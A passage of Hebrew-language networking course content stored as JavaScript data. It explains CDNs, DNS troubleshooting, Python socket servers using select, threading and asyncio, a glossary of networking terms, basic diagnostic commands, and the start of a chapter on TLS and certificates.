          <p>בקבלה – Decapsulation מלמטה למעלה: שכבת הקו מקלפת Ethernet Header, שכבת הרשת מקלפת IP Header, וכן הלאה עד שמגיעים ל-HTTP Data.</p>
        `
      },
      {
        type: "explanation",
        title: "מה קורה כשהשרת מאחורי CDN",
        content: `
          <p>Facebook, Google, Netflix – לא ניגשים ישירות לשרת Origin. קיים CDN:</p>
          <ol>
            <li><strong>DNS</strong>: facebook.com → IP של CDN Edge Node הקרוב (Anycast)</li>
            <li><strong>TLS Handshake</strong>: מול ה-Edge Node, לא מול Origin. RTT קצר!</li>
            <li><strong>HTTP GET</strong>: Edge בודק cache. Cache HIT → מגיש מיידית. Cache MISS → מביא מ-Origin, שומר, מגיש</li>
            <li><strong>תמונות, JS, CSS</strong>: מגיעים מה-Edge. <strong>HTML דינמי</strong>: עשוי לעבור ל-Origin</li>
          </ol>
          <p>סיבה לכך שFacebook נטען ב-200ms מישראל אף על פי שהשרתים באמריקה: ה-CDN Edge בתל אביב / קפריסין מגיש את רוב התוכן.</p>
        `
      },
      {
        type: "thinkOutside",
        title: "חשיבה מחוץ לקופסא – הכל מתחבר",
        intro: "<p>נקודות מבט על הארכיטקטורה השלמה:</p>",
        blocks: [
          {
            title: "כמה פקטות בגלישה אחת?",
            icon: "📊",
            content: `<p>גלישה פשוטה לעמוד GitHub: ~200 פקטות. DHCP: 4. DNS: 2. ARP: 2. TCP Handshake: 3. TLS Handshake: ~8. HTTP/2 בקשות: עשרות. גוגל Analytics, fonts, CDN assets – כל אחד = בקשת DNS + TCP + TLS + HTTP. בדף מסחרי טיפוסי עם 3rd-party scripts: 500–2000 פקטות. Wireshark על גלישה פשוטה = עולם שלם.</p>`
          },
          {
            title: "מה אם ה-DNS שלך לא עובד?",
            icon: "🔍",
            content: `<p>ניסוי: <code>ping 8.8.8.8</code> עובד אבל <code>ping google.com</code> נכשל → DNS בעיה. <code>nslookup google.com 8.8.8.8</code> עובד → DNS שלך מושבת, DNS ציבורי עובד → שנה DNS ב-network settings. <strong>DNS הוא Choke Point</strong> – ה-ISP שולט בDNS → יכול לחסום אתרים. DoH / VPN עוקפים זאת.</p>`
          }
        ]
      },
      {
        type: "summary",
        title: "סיכום פרק 11",
        content: `
          <div class="chapter-summary">
            <h3>נקודות מפתח:</h3>
            <ul>
              <li>DHCP → IP. DNS → IP של יעד. Subnet check → מקומי? לא → ARP ל-Gateway</li>
              <li>ARP → MAC של נתב. Switch מעביר Frame. נתבים מנתבים עד היעד</li>
              <li>TCP Handshake (SYN/SYN-ACK/ACK). TLS Handshake (HTTPS). HTTP/2 GET</li>
              <li>Wireshark מראה הכל: DHCP→DNS→ARP→TCP→TLS→HTTP2 בסדר</li>
              <li>CDN: TLS ו-cache ב-Edge קרוב. Origin רק ל-dynamic / cache miss</li>
            </ul>
          </div>
        `
      },
      {
        type: "questions",
        title: "שאלות הבנה - פרק 11",
        questions: [
          {
            q: "מה הסדר הנכון של הפעולות בגלישה לאתר?",
            a: "DHCP (אם צריך IP) → DNS (תרגום שם ל-IP) → בדיקת Subnet (האם היעד ברשת מקומית?) → אם לא – ARP למען MAC של Gateway → שליחת Frame ל-Switch → נתבים מנתבים → TCP Handshake → TLS Handshake (HTTPS) → HTTP GET."
          },
          {
            q: "למה ping 8.8.8.8 עובד אבל ping google.com לא?",
            a: "ping 8.8.8.8 = שולח ICMP לIP ישיר – לא צריך DNS. ping google.com = צריך תרגום שם לIP תחילה. אם DNS לא עובד – תרגום נכשל ולכן ה-ping נכשל. האינטרנט עצמו עובד, DNS לא."
          },
          {
            q: "מה ה-TLS Handshake מוסיף לתהליך ולמה הוא שווה את זה?",
            a: "TLS Handshake מוסיף RTT אחד (1.3) לפני שאפשר לשלוח HTTP. עלות: 20–100ms. תמורה: כל התקשורת מוצפנת. גם אם מישהו מסנן את הרשת (WiFi ציבורי, ISP) – רואה רק 'שטות' מוצפנת. סיסמה, cookies, תוכן – הכל מוגן."
          }
        ]
      }
    ]
  },
  {
    id: 12,
    title: "Sockets מתקדם",
    pages: [
      {
        type: "explanation",
        title: "ריבוי לקוחות",
        content: `
          <p>שרת בסיסי מטפל בלקוח אחד – accept() ו־recv() הם blocking. פתרון: <strong>select</strong> – בודק כמה Sockets, מחזיר את אלה שמוכנים. אופציות: threading, asyncio.</p>
        `
      },
      {
        type: "explanation",
        title: "select – המתנה ליותר מ־Socket אחד",
        content: `
          <p><code>select.select(read_list, write_list, error_list, timeout)</code> – מחזיר את ה־Sockets שמוכנים לפעולה. כך שרת אחד יכול להאזין ל־accept על Socket אחד ולקבל מידע מ־לקוחות קיימים – בלי לחסום. אלטרנטיבות: <strong>threading</strong> – תהליך נפרד לכל לקוח. <strong>asyncio</strong> – תכנות אסינכרוני.</p>
        `
      },
      {
        type: "demo",
        title: "המדריך מדגים: דוגמת select",
        content: `
          <p>קוד סכמטי ל־select:</p>
          <div class="code-preview">
            <pre><code>readable, _, _ = select.select([server_socket] + client_sockets, [], [], 0.1)
for s in readable:
    if s == server_socket:
        client, addr = server_socket.accept()
        client_sockets.append(client)
    else:
        data = s.recv(1024)
        if data: process(s, data)
        else: client_sockets.remove(s)</code></pre>
          </div>
          <p class="demo-note">📋 select מחזיר את ה-Sockets שמוכנים. אם server_socket – accept. אם client – recv. כך שרת אחד מטפל בהרבה לקוחות.</p>
        `
      },
      {
        type: "demo",
        title: "המדריך מדגים: שרת עם Threading",
        content: `
          <p>כל לקוח מקבל Thread נפרד – עיבוד מקבילי:</p>
          <div class="code-preview">
            <pre><code>import socket
import threading

def handle_client(client_socket, addr):
    print(f"חיבור חדש מ: {addr}")
    while True:
        data = client_socket.recv(1024)
        if not data:
            break
        client_socket.send(b"קיבלתי: " + data)
    client_socket.close()

server = socket.socket()
server.bind(('0.0.0.0', 9000))
server.listen(5)
print("מאזין...")

while True:
    client, addr = server.accept()
    t = threading.Thread(target=handle_client, args=(client, addr))
    t.daemon = True
    t.start()</code></pre>
          </div>
          <p class="demo-note">📋 כל accept() יוצר Thread חדש עם handle_client. <code>daemon=True</code> – ה-Thread יסתיים כשהתוכנה הראשית תסתיים. חסרון: הרבה לקוחות = הרבה Threads = הרבה זיכרון. פתרון: Thread Pool.</p>
        `
      },
      {
        type: "explanation",
        title: "Python 3 – Encoding וBytes",
        content: `
          <p>ב-Python 3, <code>send()</code> ו-<code>recv()</code> עובדים עם <strong>bytes</strong> – לא מחרוזות. כל טקסט חייב להיות מקודד/מפוענח:</p>
          <div class="code-preview">
            <pre><code># שליחה – המרת string ל-bytes
message = "שלום"
client_socket.send(message.encode('utf-8'))

# קבלה – המרת bytes ל-string
data = client_socket.recv(1024)
text = data.decode('utf-8')
print(text)</code></pre>
          </div>
          <p><strong>encode('utf-8')</strong> – string → bytes. <strong>decode('utf-8')</strong> – bytes → string. UTF-8 תומך בעברית ובכל תווי יוניקוד.</p>
          <p><strong>בעיית recv</strong>: recv(1024) לא מבטיח שתקבלי בדיוק 1024 בתים. ייתכן שהמסר יגיע ב-chunks מרובים. פתרון: קרא עד שמקבלים מסר שלם (למשל: שורה שמסתיימת ב-<code>\\n</code>, או קידומת שאומרת את גודל המסר).</p>
        `
      },
      {
        type: "explanation",
        title: "פרוטוקול תקשורת – Length Prefix",
        content: `
          <p>אחת הבעיות ב-Sockets: איך יודע המקבל שהמסר הסתיים? recv() יכול להחזיר חלק מהמסר.</p>
          <p><strong>פתרון 1: Delimiter</strong> – שולחים <code>\\n</code> בסוף כל מסר. מקבלים עד ה-<code>\\n</code>.</p>
          <p><strong>פתרון 2: Length Prefix</strong> – שולחים קודם את גודל המסר (4 בתים), אחר כך את המסר עצמו:</p>
          <div class="code-preview">
            <pre><code>import struct

# שליחה
def send_msg(sock, msg):
    msg = msg.encode('utf-8')
    length = struct.pack('!I', len(msg))  # 4 bytes Big-Endian
    sock.sendall(length + msg)

# קבלה
def recv_msg(sock):
    raw_len = recv_exact(sock, 4)
    length = struct.unpack('!I', raw_len)[0]
    return recv_exact(sock, length).decode('utf-8')

def recv_exact(sock, n):
    buf = b''
    while len(buf) < n:
        chunk = sock.recv(n - len(buf))
        if not chunk:
            raise ConnectionError
        buf += chunk
    return buf</code></pre>
          </div>
          <p class="demo-note">📋 struct.pack מקודד מספר לבתים. recv_exact מבטיח קבלת בדיוק n בתים. זו שיטה עמידה לפרוטוקול תקשורת אמין.</p>
        `
      },
      {
        type: "explanation",
        title: "asyncio – תכנות אסינכרוני",
        content: `
          <p><strong>asyncio</strong> הוא מודל תכנות אסינכרוני ב-Python 3. בניגוד ל-threading (Threads מקבילים), asyncio משתמש ב-event loop אחד שמחליף הקשר ביעילות:</p>
          <div class="code-preview">
            <pre><code>import asyncio

async def handle_client(reader, writer):
    addr = writer.get_extra_info('peername')
    print(f"חיבור מ: {addr}")
    while True:
        data = await reader.read(1024)
        if not data:
            break
        writer.write(b"קיבלתי: " + data)
        await writer.drain()
    writer.close()

async def main():
    server = await asyncio.start_server(
        handle_client, '0.0.0.0', 9000)
    print("מאזין...")
    async with server:
        await server.serve_forever()

asyncio.run(main())</code></pre>
          </div>
          <p><strong>async/await</strong> – סימון שפונקציה אסינכרונית. <code>await</code> מכניס ל-event loop – מאפשר לעיבד לקוחות אחרים בזמן ההמתנה.</p>
          <p><strong>יתרון</strong>: Thread אחד, אין overhead של context switch. מתאים לאלפי חיבורים בו-זמנית. <strong>חיסרון</strong>: קוד blocking אחד (כמו sleep רגיל) חוסם הכל.</p>
        `
      },
      {
        type: "summary",
        title: "סיכום פרק 12",
        content: `
          <div class="chapter-summary">
            <h3>נקודות מפתח:</h3>
            <ul>
              <li>accept/recv חסומים – שרת בסיסי מטפל בלקוח אחד</li>
              <li>select – בדיקת כמה Sockets בו-זמנית, ללא blocking</li>
              <li>threading – Thread נפרד לכל לקוח. daemon=True לניקוי אוטומטי</li>
              <li>Python 3: send/recv עם bytes. encode('utf-8') / decode('utf-8')</li>
              <li>Length Prefix – שיטה לקריאת מסרים שלמים בוודאות</li>
              <li>asyncio – event loop אחד, async/await, מתאים לאלפי חיבורים</li>
            </ul>
          </div>
        `
      },
      {
        type: "questions",
        title: "שאלות הבנה - פרק 12",
        questions: [
          {
            q: "מתי משתמשים ב-select במקום threading?",
            a: "select מתאים כשיש הרבה חיבורים שקטים (מחכים) – מעט פעילות. threading מתאים כשיש עיבוד כבד לכל לקוח. select חסכוני במשאבים, threading פשוט לכתיבה."
          },
          {
            q: "למה recv(1024) לא מספיק לקריאת מסר שלם?",
            a: "TCP הוא stream – המסר יכול להגיע ב-chunks. recv(1024) מחזיר כמה שיש בbuffer – יכול להיות פחות. צריך לקרוא בלולאה עד שמקבלים את כל הנתונים. Length Prefix פותר זאת: קוראים 4 בתים עם הגודל, ואז קוראים בדיוק אותו מספר בתים."
          },
          {
            q: "מה ההבדל בין threading לasyncio?",
            a: "threading – מספר Threads מקבילים, OS מחליף ביניהם. asyncio – Thread אחד עם event loop, Python מחליף הקשר ב-await. threading מתאים לעיבוד CPU-bound, asyncio מתאים ל-I/O-bound (רשת, קבצים). asyncio עם אלפי חיבורים יותר יעיל."
          }
        ]
      }
    ]
  },
  {
    id: 13,
    title: "מילון מושגים",
    pages: [
      {
        type: "explanation",
        title: "מושגי רשת – א-ו",
        content: `
          <table class="content-table">
            <tr><th>מונח</th><th>הסבר</th></tr>
            <tr><td>ACK</td><td>Acknowledgment – אישור קבלת נתונים ב-TCP</td></tr>
            <tr><td>Anycast</td><td>אותה IP ב-BGP ממקומות רבים – נתב ל-PoP הקרוב. CDN, DNS</td></tr>
            <tr><td>API Gateway</td><td>נקודת כניסה אחת לכל ה-microservices. Auth, routing, rate limiting</td></tr>
            <tr><td>ARP</td><td>Address Resolution Protocol – המרת IP ל-MAC ברשת מקומית</td></tr>
            <tr><td>Bandwidth</td><td>קצב העברה מקסימלי תיאורטי (Mbps, Gbps)</td></tr>
            <tr><td>BBR</td><td>TCP Congestion algorithm של Google – מדד bandwidth ולא אובדן</td></tr>
            <tr><td>BGP</td><td>Border Gateway Protocol – פרוטוקול ניתוב בין AS-ים באינטרנט</td></tr>
            <tr><td>Broadcast</td><td>שליחה לכולם ברשת. MAC: FF:FF:FF:FF:FF:FF. IPv6: אין – יש Multicast</td></tr>
            <tr><td>CA</td><td>Certificate Authority – גוף שחותם על אישורי TLS (DigiCert, Let's Encrypt)</td></tr>
            <tr><td>CDN</td><td>Content Delivery Network – רשת Edge Nodes גלובלית לתוכן קרוב למשתמש</td></tr>
            <tr><td>CIDR</td><td>Classless Inter-Domain Routing – סימון /prefix לרשתות (192.168.1.0/24)</td></tr>
            <tr><td>CNAME</td><td>DNS Record – alias (שם → שם). www.x.com → x.com</td></tr>
            <tr><td>Congestion Window (cwnd)</td><td>ב-TCP – כמה בתים השולח שולח ללא ACK בהתאם לעומס רשת</td></tr>
            <tr><td>Default Gateway</td><td>IP של הנתב המקומי – היעד לכל תעבורה מחוץ לרשת</td></tr>
            <tr><td>DHCP</td><td>Dynamic Host Configuration Protocol – הקצאת IP, Subnet, Gateway, DNS אוטומטית</td></tr>
            <tr><td>DMZ</td><td>Demilitarized Zone – אזור רשת מוגן לשרתים ציבוריים (Web, Email)</td></tr>
            <tr><td>DNS</td><td>Domain Name System – מיפוי שם דומיין ל-IP. היררכי: Root → TLD → Authoritative</td></tr>
            <tr><td>DoH</td><td>DNS over HTTPS – DNS מוצפן על פורט 443</td></tr>
            <tr><td>DoT</td><td>DNS over TLS – DNS מוצפן על פורט 853</td></tr>
            <tr><td>Dual-Stack</td><td>הפעלת IPv4 ו-IPv6 בו-זמנית על אותו ממשק</td></tr>
            <tr><td>Encapsulation</td><td>הוספת Header של שכבה – כל שכבה עוטפת את מעלה</td></tr>
            <tr><td>ESP</td><td>Encapsulating Security Payload – הצפנה + אימות ב-IPsec</td></tr>
          </table>
        `
      },
      {
        type: "explanation",
        title: "מושגי רשת – ז-מ",
        content: `
          <table class="content-table">
            <tr><th>מונח</th><th>הסבר</th></tr>
            <tr><td>FTP</td><td>File Transfer Protocol – העברת קבצים. פורט 21. SFTP = SSH File Transfer Protocol (פרוטוקול נפרד מ-FTP שרץ מעל SSH, פורט 22)</td></tr>
            <tr><td>Full Duplex</td><td>שליחה וקבלה בו-זמנית. Switch מודרני. אין התנגשויות</td></tr>
            <tr><td>Half Duplex</td><td>כיוון אחד בכל פעם. Hub. גורם להתנגשויות → CSMA/CD</td></tr>
            <tr><td>Handshake</td><td>TCP: SYN→SYN-ACK→ACK. TLS: Client Hello → Certificate → Key Exchange → Finished</td></tr>
            <tr><td>HTTP/2</td><td>Multiplexing, Binary, HPACK compression. עדיין על TCP</td></tr>
            <tr><td>HTTP/3</td><td>HTTP מעל QUIC (UDP). 0-RTT, Connection Migration, ללא HOL Blocking</td></tr>
            <tr><td>HTTPS</td><td>HTTP over TLS. פורט 443. כל התוכן מוצפן</td></tr>
            <tr><td>IKE</td><td>Internet Key Exchange – חילופי מפתחות ב-IPsec. UDP פורט 500</td></tr>
            <tr><td>IMAP</td><td>Internet Message Access Protocol – קריאת מייל מסונכרנת. פורט 143/993</td></tr>
            <tr><td>IP Fragmentation</td><td>פיצול פקטה גדולה ל-קטעים לפי MTU. IPv4 בנתבים, IPv6 רק במקור</td></tr>
            <tr><td>IPsec</td><td>Internet Protocol Security – הצפנה ברמת Layer 3. Tunnel/Transport mode</td></tr>
            <tr><td>Jitter</td><td>שינוי ב-Latency – חבילות מגיעות בזמנים לא אחידים. בעיה ל-VoIP/Video</td></tr>
            <tr><td>Latency</td><td>זמן תגובה – כמה זמן לחבילה להגיע. נמדד ב-ms</td></tr>
            <tr><td>Link-Local</td><td>IPv6 – fe80::/10. אוטומטי על כל ממשק. לא ניתב</td></tr>
            <tr><td>Load Balancer</td><td>מפנה בקשות לכמה שרתים. L4 (TCP), L7 (HTTP). Round Robin, Least Connections</td></tr>
            <tr><td>MAC</td><td>Media Access Control – כתובת פיזית 48-bit על כרטיס רשת. d4:be:d9:d6:0c:2a</td></tr>
            <tr><td>Multicast</td><td>שליחה לקבוצה. IPv6 ff02::1 = כולם, ff02::2 = נתבים. מחליף Broadcast</td></tr>
            <tr><td>MTU</td><td>Maximum Transmission Unit – גודל מקסימלי של Frame. Ethernet = 1500 בתים</td></tr>
            <tr><td>MX Record</td><td>DNS Mail Exchange – מפנה מייל לשרת עם עדיפות</td></tr>
          </table>
        `
      },
      {
        type: "explanation",
        title: "מושגי רשת – נ-ת",
        content: `
          <table class="content-table">
            <tr><th>מונח</th><th>הסבר</th></tr>
            <tr><td>NAT</td><td>Network Address Translation – IP פרטי → ציבורי. PAT = עם פורטים</td></tr>
            <tr><td>NAT64</td><td>תרגום IPv6 → IPv4. עם DNS64 לגישה לשרתים IPv4-only מ-IPv6-only clients</td></tr>
            <tr><td>NDP</td><td>Neighbor Discovery Protocol – מחליף ARP ב-IPv6. NS/NA/RS/RA</td></tr>
            <tr><td>Packet</td><td>יחידת מידע בשכבת הרשת (Layer 3). IP Packet</td></tr>
            <tr><td>Port</td><td>0–65535. מזהה תוכנה. ידועים: 80=HTTP, 443=HTTPS, 22=SSH, 53=DNS</td></tr>
            <tr><td>PoP</td><td>Point of Presence – מיקום פיזי של CDN. מאות בעולם</td></tr>
            <tr><td>PTR Record</td><td>Reverse DNS – IP → שם. 8.8.8.8 → dns.google</td></tr>
            <tr><td>QUIC</td><td>UDP-based transport. TLS 1.3 מובנה. Connection Migration. בסיס HTTP/3</td></tr>
            <tr><td>Receive Window (rwnd)</td><td>TCP Flow Control – כמה בתים המקבל יכול לקבל. מודיע בכל ACK</td></tr>
            <tr><td>REST</td><td>API ארכיטקטורה מעל HTTP. GET/POST/PUT/PATCH/DELETE על URLs</td></tr>
            <tr><td>RTO</td><td>Retransmission Timeout. RTO = SRTT + 4×RTTVAR. מוכפל עם כל timeout</td></tr>
            <tr><td>SLAAC</td><td>Stateless Address Autoconfiguration – IPv6 IP מ-prefix+MAC. ללא DHCP</td></tr>
            <tr><td>SMTP</td><td>Simple Mail Transfer Protocol – שליחת מייל. פורט 25/587</td></tr>
            <tr><td>SOA Record</td><td>Start of Authority – מטא-נתוני זון DNS: Serial, Refresh, Retry, Expire</td></tr>
            <tr><td>SSH</td><td>Secure Shell – גישה מרוחקת מוצפנת. פורט 22. מחליף Telnet</td></tr>
            <tr><td>SSL/TLS</td><td>Secure Sockets Layer / Transport Layer Security – הצפנת תקשורת. HTTPS</td></tr>
            <tr><td>Subnet Mask</td><td>מגדיר גבול רשת. /24 = 255.255.255.0. /prefix = CIDR</td></tr>
            <tr><td>TCP</td><td>Transmission Control Protocol – אמין, Handshake, ACK, Congestion Control</td></tr>
            <tr><td>Throughput</td><td>קצב העברה בפועל – נמוך מ-Bandwidth בגלל overhead ואובדן</td></tr>
            <tr><td>TLS</td><td>Transport Layer Security – הצפנה. Handshake, Certificate, AES Session Key</td></tr>
            <tr><td>TTL</td><td>Time To Live – ב-IP: מונע לולאות (traceroute). ב-DNS: כמה זמן לcache</td></tr>
            <tr><td>TXT Record</td><td>DNS Text Record – SPF, DKIM, אימות דומיין</td></tr>
            <tr><td>UDP</td><td>User Datagram Protocol – מהיר, ללא ערבויות. DNS, VoIP, Games, QUIC</td></tr>
            <tr><td>Unicast</td><td>שליחה ליעד אחד ספציפי</td></tr>
            <tr><td>VLAN</td><td>Virtual LAN – חלוקה לוגית של Switch. Broadcast Domain נפרד</td></tr>
            <tr><td>VPN</td><td>Virtual Private Network – מנהרה מוצפנת. IPsec, WireGuard, OpenVPN</td></tr>
            <tr><td>WebSocket</td><td>חיבור HTTP שמתשדרג לדו-כיווני מתמשך. Chat, Real-time</td></tr>
            <tr><td>WireGuard</td><td>VPN מינימליסטי. UDP. ChaCha20+Curve25519. Linux kernel 5.6+</td></tr>
            <tr><td>Zero Trust</td><td>אל תאמין, תמיד אמת. כל בקשה מאומתת – גם מרשת פנימית</td></tr>
          </table>
        `
      },
      {
        type: "questions",
        title: "שאלות הבנה - פרק 13",
        questions: [
          {
            q: "מה ההבדל בין Broadcast ל-Unicast ל-Multicast?",
            a: "Unicast – שליחה ליעד אחד (כתובת ספציפית). Broadcast – שליחה לכל המכשירים ברשת המקומית (MAC: FF:FF:FF:FF:FF:FF). Multicast – שליחה לקבוצה מוגדרת (ff02::1 = כל IPv6, קבוצות IGMP ב-IPv4). IPv6 ביטל Broadcast לטובת Multicast."
          },
          {
            q: "מה ההבדל בין TTL ב-IP ל-TTL ב-DNS?",
            a: "TTL ב-IP (Time To Live) – מספר hop-ים שנותרו. כל נתב מפחית ב-1. מגיע ל-0 → נזרק + ICMP Time Exceeded. traceroute משתמש בזה. TTL ב-DNS – כמה שניות ה-Resolver ישמור record ב-cache. לא קשור לנתבים."
          },
          {
            q: "מה ההבדל בין Bandwidth ל-Throughput ל-Latency?",
            a: "Bandwidth = קצב מקסימלי תיאורטי של הקישור (1Gbps). Throughput = מה עובר בפועל – תמיד נמוך (overhead, אובדן). Latency = זמן מקור לייעד (ms). אפשר bandwidth גבוה + latency גבוה (לווין). קו 100Mbps עם 500ms latency = גרוע לgames, טוב ל-backup."
          }
        ]
      }
    ]
  },
  {
    id: 14,
    title: "פקודות וכלים",
    pages: [
      {
        type: "explanation",
        title: "פקודות נפוצות",
        content: `
          <p><code>ping &lt;יעד&gt;</code> – בדיקת חיבור (ICMP Echo). <code>tracert</code> / <code>traceroute</code> – מסלול חבילות. <code>netstat</code> – פורטים פתוחים וחיבורים. <code>ipconfig</code> (Win) / <code>ifconfig</code> (Lin) – IP, MAC, Subnet, Gateway. <code>nslookup &lt;דומיין&gt;</code> – שאילתת DNS. <code>arp -a</code> – טבלת ARP Cache.</p>
        `
      },
      {
        type: "demo",
        title: "המדריך מדגים: דוגמאות פלט",
        content: `
          <p>פלט <code>ipconfig /all</code>:</p>
          <div class="code-preview">
            <pre><code>IPv4 Address: 192.168.1.105
Subnet Mask: 255.255.255.0
Default Gateway: 192.168.1.1
Physical Address: D4-BE-D9-D6-0C-2A</code></pre>
          </div>
          <p>פלט <code>nslookup google.com</code>:</p>
          <div class="code-preview">
            <pre><code>Name: google.com
Addresses: 142.250.185.46</code></pre>
          </div>
        `
      },
      {
        type: "explanation",
        title: "כלים",
        content: `
          <p><strong>Wireshark</strong> – הסנפת וניתוח תעבורת רשת (צפייה). <strong>Scapy</strong> – הסנפה, בנייה ושליחה של חבילות מפייתון. <strong>telnet</strong> – התחברות ידנית לפורט (לבדיקת HTTP וכו').</p>
        `
      },
      {
        type: "explanation",
        title: "פקודות נוספות",
        content: `
          <p><code>route print</code> (Win) / <code>ip route</code> (Lin) – טבלת ניתוב. <code>hostname</code> – שם המחשב. <code>telnet &lt;host&gt; &lt;port&gt;</code> – התחברות לפורט. <code>curl</code> – שליחת בקשת HTTP מ-command line.</p>
        `
      },
      {
        type: "summary",
        title: "סיכום פרק 14",
        content: `
          <div class="chapter-summary">
            <h3>נקודות מפתח:</h3>
            <ul>
              <li>ping, traceroute – בדיקה ומסלול. netstat – פורטים</li>
              <li>ipconfig/ifconfig – הגדרות רשת. nslookup – DNS. arp -a – ARP</li>
              <li>Wireshark, Scapy – כלי ניתוח והסנפה</li>
            </ul>
          </div>
        `
      },
      {
        type: "questions",
        title: "שאלות הבנה - פרק 14",
        questions: [
          {
            q: "איזו פקודה משתמשת לבדוק אם שרת מרוחק מגיב?",
            a: "ping – שולח ICMP Echo Request. אם התשובה מגיעה, השרת חי ומחובר. אם לא – יכול להיות חסימה, כיבוי, או בעיית רשת."
          }
        ]
      }
    ]
  },
  {
    id: 15,
    title: "HTTPS ו-TLS – תקשורת מוצפנת",
    pages: [
      {
        type: "explanation",
        title: "למה צריך הצפנה?",
        content: `
          <p>כשגולשים ב-HTTP רגיל – כל הנתונים עוברים כטקסט גלוי. כל מי שמסנן את התעבורה (ספק האינטרנט, WiFi ציבורי, האקר ב-MITM) יכול לראות:</p>
          <ul>
            <li>סיסמאות שהזנת</li>
            <li>הודעות פרטיות</li>
            <li>פרטי כרטיס אשראי</li>
            <li>כל תוכן הדף</li>
          </ul>
          <p><strong>HTTPS</strong> = HTTP over TLS – כל התקשורת מוצפנת. גם אם מישהו מסנן את הנתונים – רואה "שטות" מוצפנת.</p>
          <div class="diagram-container">
            <svg viewBox="0 0 340 80" class="content-diagram">
              <rect x="10" y="20" width="80" height="40" rx="4" fill="var(--accent-soft)" stroke="var(--accent)"/>
              <text x="50" y="44" text-anchor="middle" font-size="10">דפדפן</text>
              <rect x="250" y="20" width="80" height="40" rx="4" fill="var(--accent-soft)" stroke="var(--accent)"/>
              <text x="290" y="44" text-anchor="middle" font-size="10">שרת</text>
              <path d="M 90 35 L 250 35" stroke="var(--accent-green)" stroke-width="2.5"/>
              <text x="170" y="28" text-anchor="middle" font-size="9" fill="var(--accent-green)">🔒 מוצפן (TLS)</text>
              <path d="M 90 50 L 250 50" stroke="#c06060" stroke-width="1.5" stroke-dasharray="4,3"/>
              <text x="170" y="63" text-anchor="middle" font-size="9" fill="#c06060">HTTP גלוי – כולם רואים</text>
            </svg>
          </div>
          <p>פורט 443 = HTTPS. פורט 80 = HTTP. דפדפן מודרני מציג 🔒 כשה-TLS תקין.</p>
        `
      },
      {
        type: "explanation",
        title: "הצפנה סימטרית ואסימטרית",
        content: `
          <p>שני סוגי הצפנה שונים – שניהם חשובים ל-TLS:</p>
          <p><strong>הצפנה סימטרית</strong> – אותו מפתח להצפנה ולפענוח. מהיר מאוד (AES). בעיה: איך מעבירים את המפתח לצד השני בלי שמישהו יתפוס?</p>
          <div class="diagram-container">
            <svg viewBox="0 0 320 60" class="content-diagram">
              <rect x="10" y="15" width="60" height="30" rx="4" fill="var(--accent-soft)" stroke="var(--accent)"/>
              <text x="40" y="34" text-anchor="middle" font-size="10">Alice</text>
              <rect x="250" y="15" width="60" height="30" rx="4" fill="var(--accent-soft)" stroke="var(--accent)"/>
              <text x="280" y="34" text-anchor="middle" font-size="10">Bob</text>
              <text x="160" y="28" text-anchor="middle" font-size="9" fill="var(--accent-gold)">מפתח: 🔑 (סודי לשניהם)</text>
              <path d="M 70 30 L 250 30" stroke="var(--accent-gold)" stroke-width="2"/>
            </svg>
          </div>
          <p><strong>הצפנה אסימטרית</strong> (מפתח ציבורי/פרטי) – RSA, ECC. כל צד מייצר זוג מפתחות: <em>פרטי</em> (סודי) ו-<em>ציבורי</em> (לכולם). הצפנה עם ציבורי → רק הפרטי מפענח. <strong>חתימה</strong> עם פרטי → כולם יכולים לאמת עם ציבורי.</p>
          <p>אסימטרית פותרת את בעיית חילופי המפתח – אבל איטית. TLS משתמש בה רק לחילופי מפתחות, ואז עובר ל-AES לכל השיחה.</p>
        `
      },
      {
        type: "explanation",
        title: "TLS Handshake – שלבי ה-HTTPS",
        content: `
          <p>לפני שמגיע אפילו בייט HTTP אחד, TLS מבצע Handshake:</p>
          <div class="demo-flow">
            <ol class="demo-steps">
              <li><strong>Client Hello</strong> – הדפדפן שולח: גרסת TLS נתמכת, רשימת cipher suites, Client Random (מספר אקראי)</li>
              <li><strong>Server Hello + Certificate</strong> – השרת בוחר cipher suite, שולח Server Random, ושולח את <strong>האישור (Certificate)</strong> שלו</li>
              <li><strong>אימות האישור</strong> – הדפדפן בודק שהאישור חתום על ידי CA מהימן, שהדומיין תואם, ושלא פג תוקפו</li>
              <li><strong>Key Exchange</strong> – מחשבים <strong>Session Key</strong> (מפתח AES) מה-Client Random + Server Random + Pre-Master Secret. זה נעשה ב-Diffie-Hellman בגרסאות מודרניות</li>
              <li><strong>Finished</strong> – שני הצדדים מאשרים שה-Handshake הצליח. מעכשיו – כל תקשורת מוצפנת ב-AES</li>
            </ol>
          </div>
          <p>TLS 1.3 (2018) מבצע Handshake ב-1 Round Trip (RTT) במקום 2 – מהיר יותר.</p>
        `
      },
      {
        type: "explanation",
        title: "אישורים ו-CA – Chain of Trust",
        content: `
          <p><strong>Certificate</strong> (אישור) מכיל: שם הדומיין, המפתח הציבורי של השרת, תוקף, גוף שחתם (CA).</p>
          <p><strong>CA</strong> (Certificate Authority) – גוף מהימן שחותם על אישורים: DigiCert, Let's Encrypt, Comodo. הדפדפן סומך עליהם כי הם מובנים ב-OS ובדפדפן.</p>
          <p><strong>שרשרת אמון:</strong></p>
          <div class="diagram-container">
            <svg viewBox="0 0 300 120" class="content-diagram">
              <rect x="80" y="5" width="140" height="28" rx="4" fill="var(--accent-soft)" stroke="var(--accent)"/>
              <text x="150" y="23" text-anchor="middle" font-size="10">Root CA (מובנה ב-OS)</text>
              <path d="M 150 33 L 150 45" stroke="var(--accent)" stroke-width="2" marker-end="url(#arrowdown)"/>
              <rect x="70" y="45" width="160" height="28" rx="4" fill="var(--accent-soft)" stroke="var(--accent)"/>
              <text x="150" y="63" text-anchor="middle" font-size="10">Intermediate CA</text>
              <path d="M 150 73 L 150 85" stroke="var(--accent)" stroke-width="2" marker-end="url(#arrowdown)"/>
              <rect x="70" y="85" width="160" height="28" rx="4" fill="var(--accent-green)" stroke="var(--accent-green)" opacity="0.8"/>
              <text x="150" y="103" text-anchor="middle" font-size="10" fill="white">אישור של example.com</text>
              <defs><marker id="arrowdown" markerWidth="8" markerHeight="8" refX="3" refY="6" orient="auto"><polygon points="0 0, 6 0, 3 6" fill="var(--accent)"/></marker></defs>
            </svg>
            <p class="diagram-caption">כל CA חותם על הבא – Root CA הוא עוגן האמון</p>
          </div>
          <p><strong>Let's Encrypt</strong> – CA בחינם שפתרה את בעיית עלות האישורים. היום רוב האתרים משתמשים בה.</p>
          <p><strong>Self-Signed Certificate</strong> – שרת שחתם על עצמו. הדפדפן לא סומך עליו ומציג אזהרה. שימושי ל-dev/testing בלבד.</p>
        `
      },
      {
        type: "demo",
        title: "המדריך מדגים: HTTPS בפייתון (requests)",
